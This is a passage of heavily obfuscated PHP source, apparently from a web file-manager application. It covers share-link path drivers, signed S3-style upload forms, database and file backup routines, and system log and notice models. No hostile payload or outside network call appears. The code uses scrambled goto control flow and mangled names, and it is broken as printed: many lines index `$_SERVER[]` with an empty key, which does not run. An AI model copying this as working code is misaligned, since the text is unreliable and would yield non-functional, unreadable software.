(isset(self::$_methodList[$C̾])) { return @call_user_func_array(self::$_methodList[$C̾], $f߈ޝ); } else { if (method_exists($this, $C̾)) { return call_user_func_array(array($this, $C̾), $f߈ޝ); } else { think_exception(__CLASS__ . $c[4] . $C̾ . $c[5]); } } } public static function __callStatic($f󈐚, $f) { if (isset(self::$_methodListStatic[$f󈐚])) { return call_user_func_array(self::$_methodListStatic[$f󈐚], $f); } else { if (method_exists(self, $f󈐚)) { return call_user_func_array(array(self, $f󈐚), $f); } else { show_json("{$f󈐚}\50\51\40\x6e\157\164\40\145\170\151\163\x74\x3b", !1); } } } public static function addMethod($a, $Cأ) { self::$_methodList[$a] = $Cأ; } public static function addMethodStatic($Cأ, $dը) { self::$_methodListStatic[$Cأ] = $dը; } } goto bᮄ; FË: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($F喌) { $this->pathParse = $F喌; } protected function infoParse($fۢ, $d熻 = false) { $Bˢ =& $_SERVER[]; return Action($Bˢ[1087])->sharePathInfo($this->pathParse[$Bˢ[76]], !0, $d熻); } public function listPath($fੴ, $F낧 = false) { $Aˑ =& $_SERVER[]; $a = IO::listPath($fੴ, $F낧); foreach ($a as $C苑 => $fú) { if (!in_array($C苑, array($Aˑ[74], $Aˑ[75]))) { continue; } foreach ($fú as $FΔʆ => $F) { $F = Action($Aˑ[1240])->parsePathChildren($F, array($Aˑ[416] => $fੴ)); $a[$C苑][$FΔʆ] = Action($Aˑ[1087])->shareItemInfo($F); } } return $a; } public function listAll($A) { $fɢ虑 =& $_SERVER[]; $C = IO::listAll($A); foreach ($C as &$aض) { $b = IO::info($aض[$fɢ虑[76]]); $b = is_array($b) ? $b : array(); $aض = array_merge($b, $aض); $aض[$fɢ虑[85]] = Action($fɢ虑[1087])->shareItemInfo($aض); } unset($aض); return $C; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Bޏ) { parent::__construct($Bޏ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($dӲ) { parent::__construct($dӲ); $this->signatureVersion($_SERVER[][212]); } public function uploadFormData($C, $FҞ = 3600) { goto e߄; e߄: $a =& $_SERVER[]; $d̆ = $a[192]; $d = $a[1241]; goto D߹ԫ; D߹ԫ: $e޲ = $a[59]; $bŜ֣ = gmdate($a[1242]); $F = gmdate($a[728]); goto d愾; Eʣ: $aߏѕ = base64_encode(json_encode($C⌴)); $f켸 = hash_hmac($a[1251], $F, $a[1252] . $this->secret, !0); $dذݳ = hash_hmac($a[1251], $this->region, $f켸, !0); goto D; Cǟʉ: $BŖʷ = array($this->accessKey, $F, $this->region, $e޲, $c); $Fյ = implode($a[8], $BŖʷ); $C⌴ = array($a[1208] => gmdate($a[1207], strtotime($a[1244])), $a[1209] => array(array($a[1211] => $this->bucket), array($a[1210] => $d̆), array($a[1212], $a[1213], $a[33]), array($a[1212], $a[1245], $a[33]), array($a[1212], $a[1246], $a[33]), array($a[1214] => $A˷), array($a[1247] => $Fյ), array($a[1248] => $d), array($a[1249] => $bŜ֣), array($a[1250] => $dͲ))); goto Eʣ; d愾: $c = $a[1243]; $dͲ = $FҞ . $a[33]; $A˷ = $a[1206]; goto Cǟʉ; D: $b = hash_hmac($a[1251], $e޲, $dذݳ, !0); $bߛ = hash_hmac($a[1251], $c, $b, !0); $cژ = hash_hmac($a[1251], $aߏѕ, $bߛ); goto BǑ; BǑ: $e = array($a[211] => $a[33], $a[1253] => $a[33], $a[1210] => $d̆, $a[1214] => $A˷, $a[1218] => $aߏѕ, $a[1254] => $Fյ, $a[1255] => $d, $a[1256] => $bŜ֣, $a[1257] => $dͲ, $a[1258] => $cژ, $a[175] => $this->getHost()); return $e; goto dℒ; dℒ: } } goto E; dɓ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $a緫 =& $_SERVER[]; $this->isManual(); self::$name = date($a緫[725]); if (!($Eޤ = Model($a緫[726])->lastItem())) { $Eޤ = $this->initData(); } else { self::$name = $Eޤ[$a緫[28]]; if ($Eޤ[$a緫[727]] == $a緫[87]) { self::$name = date($a緫[728]); $Bۍ = 0; if (isset($Eޤ[$a緫[291]][$a緫[193]][$a緫[461]])) { $Bۍ = (int) $Eޤ[$a緫[291]][$a緫[193]][$a緫[461]]; } if (self::$manual == 0 && $Eޤ[$a緫[28]] == self::$name) { Model($a緫[726])->remove($Eޤ[$a緫[395]]); } $Eޤ = $this->initData($Bۍ, $Eޤ[$a緫[729]]); } else { $this->checkStore($Eޤ[$a緫[729]]); } } self::$option = $Eޤ; } private function isManual() { $a = _get($GLOBALS, $_SERVER[][730], 0); $a = intval($a); self::$manual = $a && $a == 1 ? 1 : 0; } private function initData($f = 0, $Dꕍ = '') { goto E瑘; B: $this->checkStore($c[$f[729]]); if (self::$manual == 1) { self::$name .= $f[71] . date($f[731]); } $e = array($f[729] => $c[$f[729]], $f[28] => self::$name, $f[727] => 0, $f[732] => $c[$f[732]], $f[733] => self::$manual, $f[291] => array($f[734] => array($f[727] => 0), $f[735] => array($f[727] => 0, $f[736] => 0, $f[737] => 0, $f[29] => $f[33], $f[738] => 0, $f[490] => 0), $f[739] => array($f[727] => 0, $f[736] => 0, $f[737] => 0, $f[738] => 0, $f[490] => 0), $f[193] => array($f[727] => 0, $f[740] => 0, $f[741] => 0, $f[742] => 0, $f[743] => 0, $f[461] => $f, $f[738] => 0, $f[490] => 0)), $f[738] => time(), $f[490] => 0); goto Fǫ׭; E瑘: $f =& $_SERVER[]; $c = Model($f[726])->config(); if ($Dꕍ && $c[$f[729]] != $Dꕍ) { $f = 0; } goto B; Fǫ׭: $C = Model($f[726])->insert($e); $e[$f[395]] = $C; return $e; goto Fŋθ; Fŋθ: } private function checkStore($a) { $D뒨 =& $_SERVER[]; $Dƹ = Model($D뒨[744])->listData($a); Model($D뒨[744])->checkConfig($Dƹ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][726])->findByName(self::$name); } return self::$option; } public static function set($fݩ͊) { $a =& $_SERVER[]; $Dِ = self::get(); foreach ($fݩ͊ as $dÛ => $bސϖ) { $BЭ = explode($a[95], $dÛ); $a = count($BЭ); switch ($a) { case 1: $Dِ[$BЭ[0]] = $bސϖ; break; case 2: $Dِ[$BЭ[0]][$BЭ[1]] = $bސϖ; break; case 3: $Dِ[$BЭ[0]][$BЭ[1]][$BЭ[2]] = $bސϖ; break; } } Model($a[726])->update($Dِ[$a[395]], $Dِ); self::$option = $Dِ; return self::$option; } public function keep() { $Fܭ =& $_SERVER[]; $DּΫو = self::get(); if ($DּΫو[$Fܭ[291]][$Fܭ[734]][$Fܭ[727]] == $Fܭ[87]) { return; } $this->backupKeep($DּΫو); self::set(array($Fܭ[745] => 1)); } private function backupKeep($AȾЍ) { goto B߲; bɆ֎: foreach ($cԨ as $A) { if ($Dٮˊ >= 7) { break; } $cŤ[] = $A[$bǱ[28]]; $Dٮˊ++; } for ($Dٮˊ = 0; $Dٮˊ < 12; $Dٮˊ++) { $cŤ[] = date($bǱ[746], strtotime("\x2d{$Dٮˊ}\40\155\x6f\x6e\x74\x68\x73")); } $cŤ = array_unique($cŤ); goto Dٰۆ; Dٰۆ: $b÷ = Model($bǱ[747])->get($bǱ[748]); foreach ($cԨ as $A) { if (isset($A[$bǱ[733]]) && $A[$bǱ[733]] == $bǱ[87]) { continue; } if (!empty($A[$bǱ[28]]) && in_array($A[$bǱ[28]], $cŤ)) { continue; } Model($bǱ[726])->remove($A[$bǱ[395]]); $c = $this->backupPath($AȾЍ, $b÷); IO::remove($c, !1); } goto FҮ; B߲: $bǱ =& $_SERVER[]; if (self::$manual == 1) { return; } $cԨ = Model($bǱ[726])->listData(); goto CƋ; CƋ: if (empty($cԨ)) { return; } $Dٮˊ = 0; $cŤ = array(); goto bɆ֎; FҮ: } private function backupPath($Bȼͦ, $BĨ = false) { $AΫ =& $_SERVER[]; if (!$BĨ) { $BĨ = Model($AΫ[747])->get($AΫ[748]); } $dͷ = $Bȼͦ[$AΫ[28]]; $Aɦ = substr(md5($AΫ[749] . $BĨ . $dͷ), 0, 8); return "\x7b\151\x6f\72{$Bȼͦ[$AΫ[729]]}\x7d\57\144\x61\164\x61\x62\x61\x73\145\57\x62\141\x63\x6b\x75\160\57" . $dͷ . $AΫ[71] . $Aɦ; } public function db() { goto B֬㌃; b: $D毘 = new BackupDb(); if (!$D毘->index()) { return !1; } self::set(array($dΧЈ[750] => 1)); goto B; B֬㌃: $dΧЈ =& $_SERVER[]; $Bէ = self::get(); if ($Bէ[$dΧЈ[291]][$dΧЈ[735]][$dΧЈ[727]] == $dΧЈ[87]) { return !0; } goto b; B: return !0; goto Aꈊ; Aꈊ: } public function dbFile() { goto eѽ; eѽ: $F =& $_SERVER[]; $Cٻװ = self::get(); if ($Cٻװ[$F[291]][$F[739]][$F[727]] == $F[87]) { return !0; } goto cݼՏ; dʔ: return !0; goto Cב; cݼՏ: $a = new BackupDbFile(); if (!$a->index()) { return !1; } self::set(array($F[751] => 1)); goto dʔ; Cב: } public function file() { $e˙ =& $_SERVER[]; $EƟ = self::get(); if ($EƟ[$e˙[291]][$e˙[193]][$e˙[727]] == $e˙[87]) { return !0; } if (!isset($EƟ[$e˙[732]]) || $EƟ[$e˙[732]] == $e˙[191]) { $aͪ = new BackupFile(); if (!$aͪ->index()) { return !1; } } self::set(array($e˙[752] => 1, $e˙[727] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto F; Fȍ: self::$name = $E[$Bл[28]]; $Aԋ = $GLOBALS[$Bл[6]][$Bл[17]]; $c = $this->_dbType($Aԋ); goto dǯװú; c׵: $dъ = $this->tmpFilesPath() . $Bл[755] . self::$name . $Bл[8]; del_dir($dъ); mk_dir($dъ); goto dס; F: $Bл =& $_SERVER[]; $E = Backup::get(); self::$io = $E[$Bл[729]]; goto Fȍ; dס: $f݃ = $ĉ = 0; try { $b㋈ċ = $d->db()->getTables(); } catch (Exception $c) { return !1; } $b㋈ċ = array_diff($b㋈ċ, array($Bл[756], $Bл[757])); goto DИ; DИ: foreach ($b㋈ċ as $Dܴڇ) { $f݃ += $d->model($Dܴڇ)->count(); } $B㈧䶐 = new Task($Bл[758], $Bл[759], $f݃, LNG($Bл[760]) . $Bл[761] . LNG($Bл[762])); foreach ($b㋈ċ as $Dܴڇ) { $A󤴋 = $dъ . $Dܴڇ . $Bл[763]; $C翐 = null; if ($Dܴڇ == $Bл[764] && (!isset($E[$Bл[732]]) || $E[$Bл[732]] == $Bл[191])) { $C翐 = self::$io; } $ĉ += $d->sqlFromDb($Dܴڇ, $A󤴋, $B㈧䶐, $C翐); } goto Dɶ; Dɶ: if (isset($B㈧䶐->task[$Bл[765]])) { $b岧 = $B㈧䶐->task[$Bл[765]] ? $B㈧䶐->task[$Bл[765]] : timeFloat(); $B = $b岧 - $B㈧䶐->task[$Bл[766]]; if ($B >= 0.2) { $f݃ += 1; } } $B㈧䶐->end(); $c˚޴ = array($Bл[753] => $c, $Bл[750] => 1, $Bл[767] => $f݃, $Bл[768] => $ĉ, $Bл[769] => time()); goto aɣ; dǯװú: $d = new DbManage($Aԋ, $c); $c˚޴ = array($Bл[753] => $c, $Bл[754] => time()); Backup::set($c˚޴); goto c׵; aɣ: Backup::set($c˚޴); if ($f݃ - $ĉ > 1) { $Fޢͬ = $Bл[770]; if (stristr(I18n::getType(), $Bл[771])) { $Fޢͬ = $Bл[772]; } write_log(array($Fޢͬ, $c˚޴), $Bл[759]); return !1; } return !0; goto Dٌ; Dٌ: } private function _dbType($Dͷӗ) { goto dϫʓ; dϫʓ: $Eꄳ =& $_SERVER[]; $Dͷӗ = array_change_key_case($Dͷӗ); $E = $Dͷӗ[$Eꄳ[773]]; goto D; Cő륓: return $E; goto cÜ; D: if ($E == $Eꄳ[774]) { $Aݢ = explode($Eꄳ[4], $Dͷӗ[$Eꄳ[775]]); $E = $Aݢ[0]; } $c⺮ = array($Eꄳ[776] => $Eꄳ[9], $Eꄳ[777] => $Eꄳ[778]); if (isset($c⺮[$E])) { $E = $c⺮[$E]; } goto Cő륓; cÜ: } private function tmpFilesPath() { $dؕ =& $_SERVER[]; $E÷ = TEMP_FILES; if ($GLOBALS[$dؕ[6]][$dؕ[88]][$dؕ[779]]) { $E÷ = $GLOBALS[$dؕ[6]][$dؕ[88]][$dؕ[779]]; if (!mk_dir($E÷) || !is_writable($E÷) || !IO::mkfile($E÷ . $dؕ[780])) { $E÷ = TEMP_FILES; } } return $E÷; } } class BackupDbFile { public function __construct() { } public function index() { goto a݃; D﫱: $F괖ă = new TaskFileTransfer($bְܑ[783], $bְܑ[759], count($BѢ), LNG($bְܑ[760]) . $bְܑ[454] . LNG($bְܑ[762]) . $bְܑ[784]); $F괖ă->task[$bְܑ[740]] = $b; foreach ($C[$bְܑ[74]] as $cÎ) { $A쓶 = IO::move($cÎ[$bְܑ[76]], $f); if (!$A쓶) { $F괖ă->end(); $eЄ = IO::getLastError($bְܑ[785] . $cÎ[$bְܑ[76]] . $bְܑ[786] . $f . $bְܑ[530]); write_log($eЄ, $bְܑ[759]); return !1; } } goto eʖ; A: Backup::set($B); return !0; goto c; eˊ: if (!$b) { return !1; } $B = array($bְܑ[781] => $b, $bְܑ[782] => time()); Backup::set($B); goto D﫱; C֭: $AՐ = $this->tmpFilesPath() . "\x62\x61\143\x6b\x75\160\137{$BϑŊ}\57"; $f = $this->backupPath($eт); if (!($f = IO::mkdir($f))) { return !1; } goto Dم; a݃: $bְܑ =& $_SERVER[]; $eт = Backup::get(); $BϑŊ = $eт[$bְܑ[28]]; goto C֭; eʖ: $B蔶 = CONTROLLER_DIR . $bְܑ[787]; $DВ١ = CONTROLLER_DIR . $bְܑ[788]; IO::copy($B蔶, $f); goto D։ȍ; D։ȍ: IO::copy($DВ١, $f); $F괖ă->end(); $B = array($bְܑ[789] => $b, $bְܑ[790] => time()); goto A; Dم: $C = IO::listPath($AՐ); $BѢ = isset($C[$bְܑ[74]]) ? $C[$bְܑ[74]] : array(); $b = array_sum(array_column($BѢ, $bְܑ[78])); goto eˊ; c: } private function backupPath($A͛Ŕ) { $D暙 =& $_SERVER[]; $Fڲ = $A͛Ŕ[$D暙[28]]; $f㊯ = Model($D暙[747])->get($D暙[748]); $C֡ = substr(md5($D暙[749] . $f㊯ . $Fڲ), 0, 8); return "\x7b\151\157\72{$A͛Ŕ[$D暙[729]]}\x7d\57\144\141\x74\x61\x62\x61\x73\145\57\142\141\x63\153\x75\x70\x2f" . $Fڲ . $D暙[71] . $C֡; } private function tmpFilesPath() { $dΝ۴ =& $_SERVER[]; $Cآ = TEMP_FILES; if ($GLOBALS[$dΝ۴[6]][$dΝ۴[88]][$dΝ۴[779]]) { $Cآ = $GLOBALS[$dΝ۴[6]][$dΝ۴[88]][$dΝ۴[779]]; if (!mk_dir($Cآ) || !is_writable($Cآ) || !IO::mkfile($Cآ . $dΝ۴[780])) { $Cآ = TEMP_FILES; } } return $Cآ; } } goto FѻȽ; D: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\x6c\157\147"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\x69\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\x73\145\162\x74", "\146\x75\156\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Cʵ =& $_SERVER[]; return array($Cʵ[2028] => LNG($Cʵ[2029]), $Cʵ[2030] => LNG($Cʵ[2031]), $Cʵ[1655] => LNG($Cʵ[2032]), $Cʵ[2033] => LNG($Cʵ[2034]), $Cʵ[2035] => LNG($Cʵ[2036]), $Cʵ[2037] => LNG($Cʵ[2038]), $Cʵ[2039] => LNG($Cʵ[2040]), $Cʵ[1685] => LNG($Cʵ[2040]), $Cʵ[1686] => LNG($Cʵ[2041]), $Cʵ[2042] => LNG($Cʵ[2043]), $Cʵ[2044] => LNG($Cʵ[2045]), $Cʵ[2046] => LNG($Cʵ[2047]), $Cʵ[2048] => LNG($Cʵ[2049]), $Cʵ[1683] => LNG($Cʵ[2050]), $Cʵ[2051] => LNG($Cʵ[2052]), $Cʵ[1690] => LNG($Cʵ[2053]), $Cʵ[2054] => LNG($Cʵ[2055]), $Cʵ[2056] => LNG($Cʵ[2057]), $Cʵ[2058] => LNG($Cʵ[2059]), $Cʵ[2060] => LNG($Cʵ[2061]), $Cʵ[1693] => LNG($Cʵ[2062]), $Cʵ[1694] => LNG($Cʵ[2063]), $Cʵ[2064] => LNG($Cʵ[2065]), $Cʵ[2066] => LNG($Cʵ[2067]), $Cʵ[2068] => LNG($Cʵ[2069]), $Cʵ[1688] => LNG($Cʵ[2070]), $Cʵ[2071] => LNG($Cʵ[2072]), $Cʵ[1687] => LNG($Cʵ[2073]), $Cʵ[2074] => LNG($Cʵ[2075]), $Cʵ[2076] => LNG($Cʵ[2077]), $Cʵ[2078] => LNG($Cʵ[2079]), $Cʵ[2080] => LNG($Cʵ[2080]), $Cʵ[2081] => LNG($Cʵ[1659]), $Cʵ[2082] => LNG($Cʵ[2083]), $Cʵ[2084] => LNG($Cʵ[2085]), $Cʵ[2086] => LNG($Cʵ[2087]), $Cʵ[2088] => LNG($Cʵ[2089]), $Cʵ[2090] => LNG($Cʵ[2091]), $Cʵ[2092] => LNG($Cʵ[2092]), $Cʵ[2093] => LNG($Cʵ[2094]), $Cʵ[2095] => LNG($Cʵ[2096]), $Cʵ[2097] => LNG($Cʵ[2098]), $Cʵ[2099] => LNG($Cʵ[2100]), $Cʵ[2101] => LNG($Cʵ[2102]), $Cʵ[2103] => LNG($Cʵ[2104])); } private function typeFile() { $a =& $_SERVER[]; $aӆ = array($a[1690] => array($a[1691]), $a[2046] => array($a[2105]), $a[2048] => array($a[2106]), $a[1683] => array($a[1684]), $a[2056] => array(), $a[2058] => array(), $a[2060] => array(), $a[1693] => array($a[1695]), $a[1694] => array($a[1695]), $a[2064] => array($a[2107]), $a[2066] => array($a[2107]), $a[2068] => array($a[2108]), $a[2054] => array($a[2109]), $a[1688] => array($a[2110]), $a[2071] => array($a[2111]), $a[1687] => array($a[1689])); return $aӆ; } private function typeAll() { goto aߊѵ; b: return $Eˆ; goto Cގъ; aߊѵ: $fظ =& $_SERVER[]; $Eˆ = $this->typeList; $eź = array_filter($this->typeFile()); goto B; B: foreach ($eź as $Bū⸆ => $BҎ) { $Eˆ[$BҎ[0]] = $Eˆ[$Bū⸆]; } $Eˆ[$fظ[1695]] = LNG($fظ[2112]); $Eˆ[$fظ[2107]] = LNG($fظ[2113]); goto b; Cގъ: } public function addLog($eَ៣, $d = array()) { goto f˝㋘; C: if (!$Bۄݗ) { $Bۄݗ = (int) Session::get($e[1846]); } $DϢ = get_client_ip(); if (!$d || strlen(json_encode($d)) >= 1024) { $d = array($e[2114] => $DϢ); } else { if (is_array($d)) { $d[$e[2114]] = $DϢ; } else { $d = array($e[1105] => $d, $e[2114] => $DϢ); } } goto aˢ; aˢ: $d = array($e[1536] => Session::sign(), $e[1537] => $Bۄݗ, $e[29] => $eَ៣, $e[1539] => json_encode($d)); parent::add($d); goto cþؾ; f˝㋘: $e =& $_SERVER[]; if (!isset($this->typeList[$eَ៣])) { return; } $Bۄݗ = defined($e[468]) && USER_ID ? USER_ID : (isset($d[$e[1546]]) ? $d[$e[1546]] : 0); goto C; cþؾ: } public function remove($A) { $this->where(array($_SERVER[][414] => $A))->delete(); } private function _makeOrder($Aܢ = '') { goto aֈ; aֈ: $Eϳϵ =& $_SERVER[]; $eՎ = $Eϳϵ[194]; $a鍳 = array($Eϳϵ[442] => $Eϳϵ[443], $Eϳϵ[444] => $Eϳϵ[445]); goto a̽; EՒ: return $this->order($Aܢ); goto d潼; a̽: $E = Input::get($Eϳϵ[450], $Eϳϵ[7], $Eϳϵ[1878], array($Eϳϵ[1802], $Eϳϵ[444])); $E = $a鍳[$E]; $Aܢ = $Aܢ . "{$eՎ}\x20{$E}"; goto EՒ; d潼: } public function get($Eۉ = '') { goto A΅М; e󏱻: $Fδ[$e󩇠ع[367]] = $this->logList($Fδ[$e󩇠ع[367]]); return $Fδ; goto fϘ; f؊: if ($Eۉ[$e󩇠ع[1546]]) { $Fن[$e󩇠ع[1546]] = $Eۉ[$e󩇠ع[1546]]; } if (isset($Eۉ[$e󩇠ع[738]])) { $F͝ = $Eۉ[$e󩇠ع[738]]; $D = isset($Eۉ[$e󩇠ع[490]]) ? $Eۉ[$e󩇠ع[490]] : time(); $Fن[$e󩇠ع[194]] = array($e󩇠ع[331], array($F͝, $D)); } if ($Eۉ[$e󩇠ع[29]]) { $cݤ = explode($e󩇠ع[47], $Eۉ[$e󩇠ع[29]]); $Bȍ = $this->typeFile(); $C͛ؕ = array(); foreach ($cݤ as $Aĕ) { $C͛ؕ[] = $Aĕ; if (isset($Bȍ[$Aĕ])) { $C͛ؕ = array_merge($C͛ؕ, $Bȍ[$Aĕ]); } } $C͛ؕ = array_unique($C͛ؕ); if ($C͛ؕ) { $Fن[$e󩇠ع[29]] = array($e󩇠ع[7], $C͛ؕ); } } else { $Fن[$e󩇠ع[29]] = array($e󩇠ع[2115], $e󩇠ع[2116]); } goto f; f: if (!empty($Eۉ[$e󩇠ع[2114]])) { $Fن[$e󩇠ع[445]] = array($e󩇠ع[381], "\45{$Eۉ[$e󩇠ع[2114]]}\x25"); } $Fδ = $this->_makeOrder()->where($Fن)->selectPage(); if (empty($Fδ[$e󩇠ع[367]])) { show_json(array(), !0, $Fδ[$e󩇠ع[364]]); } goto e󏱻; A΅М: $e󩇠ع =& $_SERVER[]; if (!$Eۉ) { show_json(array()); } $Fن = array(); goto f؊; fϘ: } private function ipAddress(&$AĚ) { $D鋂Ґ =& $_SERVER[]; if (!empty($AĚ[$D鋂Ґ[2114]])) { $e = IpLocation::get($AĚ[$D鋂Ґ[2114]]); } else { $e = LNG($D鋂Ґ[2117]); } $AĚ[$D鋂Ґ[2118]] = $e; } private function descZipDownload($B냐, &$F̱פ) { $b =& $_SERVER[]; if (!isset($B냐[$b[2119]])) { return; } $E̪ = json_decode($B냐[$b[2119]], !0); foreach ($E̪ as $a) { try { $EچȢ = IO::infoFull($a[$b[76]]); } catch (Exception $Bۋ) { continue; } $B냐[$b[76]] = $a[$b[76]]; $F̱פ[] = $B냐[$b[397]] = $EچȢ[$b[397]]; $F̱פ[] = $B냐[$b[1932]] = $EچȢ[$b[492]]; break; } return $B냐; } private function getSourceList(&$bϊ깘) { $c =& $_SERVER[]; $C۪ = array(); foreach ($bϊ깘 as $e⎭ => $BÖƪ) { goto Fى; fچ: $C۪[] = $fﻦ[$c[397]]; $C۪[] = $fﻦ[$c[1932]]; if ($fﻦ[$c[29]] == $c[545]) { $C۪[] = $fﻦ[$c[445]][$c[1072]]; $C۪[] = $fﻦ[$c[445]][$c[1073]]; } goto B򑼧; Fى: $fﻦ = json_decode($BÖƪ[$c[445]], !0); if ($BÖƪ[$c[29]] == $c[1686]) { $fﻦ = $this->descZipDownload($fﻦ, $C۪); $bϊ깘[$e⎭][$c[445]] = json_encode($fﻦ); continue; } if (strpos($BÖƪ[$c[29]], $c[1933]) !== 0) { if (!isset($fﻦ[$c[76]]) || strpos($BÖƪ[$c[29]], $c[2120]) !== 0) { continue; } try { $bϋ = IO::infoFull($fﻦ[$c[76]]); } catch (Exception $f܋) { continue; } $C۪[] = $fﻦ[$c[397]] = $bϋ[$c[397]]; $C۪[] = $fﻦ[$c[1932]] = $bϋ[$c[492]]; $bϊ깘[$e⎭][$c[445]] = json_encode($fﻦ); continue; } goto fچ; B򑼧: if ($fﻦ[$c[29]] == $c[1940]) { $C۪[] = $fﻦ[$c[445]][$c[397]]; } goto a֦ꐒ; a֦ꐒ: } if (!$C۪) { return array(); } return Model($c[809])->sourceListInfo($C۪, !0); } private function logList($cב) { goto Fďֳ; E蝉: $a = array(); foreach ($cב as $bˍ => $bډ) { goto d͍; aӐ: $this->ipAddress($bډ); if (strpos($Bƪ, $cȭ[1933]) === 0 || isset($A[$cȭ[1932]])) { goto dߕ; dߕ: $A[$cȭ[85]] = $FĮ[$A[$cȭ[397]]]; $A[$cȭ[1945]] = $FĮ[$A[$cȭ[1932]]]; if ($A[$cȭ[29]] == $cȭ[545]) { $A[$cȭ[445]][$cȭ[1072]] = $FĮ[$A[$cȭ[445]][$cȭ[1072]]]; $A[$cȭ[445]][$cȭ[1073]] = $FĮ[$A[$cȭ[445]][$cȭ[1073]]]; } goto BЩ; A桴: if ($A[$cȭ[1945]] && $A[$cȭ[1945]][$cȭ[406]] == $cȭ[1188]) { $a[] = $bډ[$cȭ[395]]; unset($cב[$bˍ]); continue; } goto B; BЩ: if ($A[$cȭ[29]] == $cȭ[1940]) { $A[$cȭ[445]][$cȭ[397]] = $FĮ[$A[$cȭ[445]][$cȭ[397]]]; } if ($A[$cȭ[29]] == $cȭ[1681]) { $A[$cȭ[1945]] = $A[$cȭ[85]]; $A[$cȭ[1932]] = $A[$cȭ[1945]][$cȭ[397]]; $A[$cȭ[85]] = !1; $A[$cȭ[397]] = $cȭ[33]; } if ($A[$cȭ[85]] && $A[$cȭ[85]][$cȭ[406]] == $cȭ[1188]) { $a[] = $bډ[$cȭ[395]]; unset($cב[$bˍ]); continue; } goto A桴; B: } $bډ[$cȭ[445]] = $A; goto c; c: unset($bډ[$cȭ[2123]]); $E[] = $bډ; goto d; d͍: $Bƪ = $bډ[$cȭ[29]]; $F㍉ = isset($eܼ[$bډ[$cȭ[1546]]]) ? $eܼ[$bډ[$cȭ[1546]]] : !1; $Cñ = strpos($Bƪ, $cȭ[2121]) === 0 ? LNG($cȭ[2122]) : LNG($cȭ[2117]); goto b; b: $bډ[$cȭ[28]] = isset($F㍉[$cȭ[28]]) ? $F㍉[$cȭ[28]] : LNG($cȭ[2117]); $bډ[$cȭ[1980]] = isset($F㍉[$cȭ[1980]]) ? $F㍉[$cȭ[1980]] : $cȭ[33]; $bډ[$cȭ[1449]] = isset($fڛ׹[$Bƪ]) ? $fڛ׹[$Bƪ] : $Cñ; goto Bĉ; Bĉ: $bډ[$cȭ[1877]] = $F㍉; $A = json_decode($bډ[$cȭ[445]], !0); $bډ[$cȭ[2114]] = isset($A[$cȭ[2114]]) ? $A[$cȭ[2114]] : $cȭ[33]; goto aӐ; d: } $this->clearSystemPathLog($a); goto bٹŲ; Fďֳ: $cȭ =& $_SERVER[]; $bŐ̒ = array_to_keyvalue($cב, $cȭ[33], $cȭ[1546]); $eܼ = Model($cȭ[532])->userListInfo(array_unique($bŐ̒)); goto dʤݖ; dʤݖ: $FĮ = $this->getSourceList($cב); $fڛ׹ = $this->typeAll(); $E = array(); goto E蝉; bٹŲ: return $E; goto eȷ; eȷ: } private function clearSystemPathLog($CŠǺ) { $eɰ =& $_SERVER[]; if (count($CŠǺ) == 0) { return; } $bӌ = array($eɰ[395] => array($eɰ[7], array_unique($CŠǺ))); $this->where($bӌ)->delete(); } public function deviceList($A摝, $C쌧߬ = 0) { $cޕ隻 =& $_SERVER[]; $B = array($cޕ隻[1546] => $A摝, $cޕ隻[194] => array($cޕ隻[990], $C쌧߬), $cޕ隻[29] => $cޕ隻[1655]); $D懿 = array(); $A = $this->field($cޕ隻[2124])->where($B)->order($cޕ隻[1943])->limit(50)->select(); foreach ($A as $c => $dڃ) { goto B; B: if ($c > 0 && abs($dڃ[$cޕ隻[194]] - $A[$c - 1][$cޕ隻[194]]) < 5) { continue; } $eߪ = json_decode($dڃ[$cޕ隻[445]], !0); $dڃ[$cޕ隻[2114]] = isset($eߪ[$cޕ隻[2114]]) ? $eߪ[$cޕ隻[2114]] : $cޕ隻[33]; goto dŮ; dŮ: unset($eߪ[$cޕ隻[2114]]); $Bƍ՞ = $this->deviceType($eߪ[$cޕ隻[1934]]); if (isset($D懿[$Bƍ՞])) { continue; } goto F֫; F֫: $this->ipAddress($dڃ); $dڃ[$cޕ隻[445]] = $eߪ; $D懿[$Bƍ՞] = $dڃ; goto dᡌ; dᡌ: } return array_values($D懿); } public function deviceType($aغ) { return $aغ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\x6e\x6f\x74\151\143\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\143\157\156\x74\x65\x6e\164", "\141\x75\164\150", "\x6d\x6f\x64\x65", "\164\x69\155\145", "\x74\x79\160\145", "\x6c\145\x76\x65\154", "\145\x6e\141\142\154\x65", "\163\x6f\162\164"); public function listData($d历Î = false, $D = "\163\x6f\162\x74", $cԙ = false) { return parent::listData($d历Î, $D, $cԙ); } public function add($B답) { $Eɝ =& $_SERVER[]; $Dۅ = time(); if ($B답[$Eɝ[12]] == $Eɝ[2125]) { $Dۅ = strtotime($B답[$Eɝ[197]]); } $B답[$Eɝ[197]] = $Dۅ; return parent::insert($B답); } public function update($D⒕, $e뗽) { goto B⸩; Cۛ: $D嶂 = time(); if ($e뗽[$eڟ[12]] == $eڟ[2125]) { $D嶂 = strtotime($e뗽[$eڟ[197]]); } $e뗽[$eڟ[197]] = $D嶂; goto D; D: return parent::update($D⒕, $e뗽); goto aݩׄ; B⸩: $eڟ =& $_SERVER[]; $Aÿδ = $this->listData($D⒕); if (!$Aÿδ) { return !1; } goto Cۛ; aݩׄ: } public function remove($bފ) { $Bւ = $this->listData($bފ); if (!$Bւ || $Bւ[$_SERVER[][1188]]) { return !1; } return parent::remove($bފ); } public function sort($B, $aϗ) { return parent::update($B, $aϗ); } public function enable($Cɮ, $b) { return parent::update($Cɮ, array($_SERVER[][2126] => $b)); } private function initUserOption() { $fȱ =& $_SERVER[]; $this->optionType = $fȱ[2127]; $this->modelType = $fȱ[2128]; $this->field = array($fȱ[2129], 